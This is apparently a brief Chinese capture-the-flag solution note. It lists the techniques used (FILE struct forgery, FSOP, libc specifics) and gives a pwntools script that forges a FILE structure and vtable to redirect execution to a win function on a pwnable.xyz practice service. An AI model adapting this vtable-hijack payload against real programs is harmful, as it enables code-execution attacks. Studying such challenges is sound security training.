知识点：

- FILE 伪造
- FSOP
- libc指定



脚本：

```python
from pwn import *

win_addr = 0x4007ec
vtable_addr = 0x601260 + 0xd8 + 0x8


payload = p64(0) * 17
payload += p64(0x601260)
payload += p64(0) * 9
payload += p64(vtable_addr)
payload += p64(0) * 2
payload += p64(win_addr)


p = remote('svc.pwnable.xyz', 30018)
# p = process('./challenge')


p.sendlineafter(b'> ', payload)
p.interactive()

```

